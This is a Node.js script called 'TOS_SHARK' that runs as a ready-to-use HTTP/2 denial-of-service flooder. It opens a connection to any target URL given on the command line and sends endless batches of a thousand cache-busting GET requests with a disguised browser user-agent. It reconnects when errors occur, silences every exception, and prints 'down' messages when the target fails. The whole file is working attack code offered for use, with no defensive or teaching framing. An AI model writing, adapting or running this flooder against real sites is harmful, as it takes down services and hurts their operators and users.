const http2 = require('http2');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.target = target;
        this.running = true;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        
        // Single H2 connection - NO POOLING (causes leaks)
        this.client = null;
        this.createConnection();
        
        // Print header once
        console.log(`TØS-SHARK | *.* | MT-3M22`);
        console.log('-----------------------------------------------------------------');
        
        this.start();
    }

    color(t, c) {
        const colors = { r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', x: '\x1b[0m' };
        return `${colors[c] || ''}${t}${colors.x}`;
    }

    createConnection() {
        try {
            if (this.client) {
                try { this.client.destroy(); } catch (e) {}
            }
            
            this.client = http2.connect(this.target, {
                maxSessionMemory: 2048, // MINIMAL memory
                maxDeflateDynamicTableSize: 1024
            });
            
            this.client.setMaxListeners(1); // MINIMAL listeners
            
            // SIMPLE error handler - just recreate
            this.client.on('error', () => {
                setTimeout(() => this.createConnection(), 100);
            });
            
        } catch (err) {
            setTimeout(() => this.createConnection(), 100);
        }
    }

    start() {
        // Start attack IMMEDIATELY
        this.attackLoop();
        
        process.on('SIGINT', () => {
            this.running = false;
            if (this.client) this.client.destroy();
            process.exit(0);
        });
    }

    async attackLoop() {
        while (this.running) {
            if (!this.client || this.client.destroyed || this.client.closed) {
                await this.sleep(10);
                continue;
            }
            
            // MAX RPS - 1000 requests in batch, NO AWAIT between
            for (let i = 0; i < 1000; i++) {
                this.sendRequest();
            }
            
            // MICRO delay only
            await this.sleep(0.01);
        }
    }

    sendRequest() {
        if (!this.client) return;
        
        this.reqCounter++;
        this.totalReqs++;
        
        try {
            const req = this.client.request({
                ':method': 'GET',
                ':path': `/?${Date.now()}`,
                ':authority': this.host,
                'user-agent': 'Mozilla/5.0',
                'accept': '*/*'
            });
            
            // DESTROY IMMEDIATELY after response - NO MEMORY HOLD
            req.on('response', (headers) => {
                const status = headers[':status'];
                this.logStatus(status);
                req.destroy(); // CRITICAL: Destroy stream
            });
            
            req.on('error', () => {
                this.logStatus('TIMEOUT');
                req.destroy(); // CRITICAL
            });
            
            req.on('close', () => {
                // Stream cleaned up
            });
            
            req.end();
            
        } catch (err) {
            this.logStatus('ERROR');
        }
    }

    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 5000) {
            this.lastLog = now;
            
            let color = 'g';
            let text = status;
            
            if (status === 'TIMEOUT' || status === 'ERROR') {
                color = 'r';
                text = status === 'TIMEOUT' ? 'TIMEOUT' : 'ERROR';
            } else if (typeof status === 'number' && status >= 500) {
                color = 'r';
                text = status;
            } else if (typeof status === 'number' && status >= 400) {
                color = 'y';
                text = status;
            }
            
            console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
            
            // Down event
            if (color === 'r' && (text === 'TIMEOUT' || (typeof status === 'number' && status >= 500))) {
                console.log(this.color(`{3M22-${this.reqCounter} --> ${text}}`, 'r'));
            }
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// GLOBAL MEMORY PROTECTION
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// FORCE GC every 30 seconds if available
if (global.gc) {
    setInterval(() => global.gc(), 30000);
}

// Run
if (require.main === module) {
    if (process.argv.length < 3) {
        console.log('Usage: node --max-old-space-size=4096 TOS.js https://target.com');
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
}
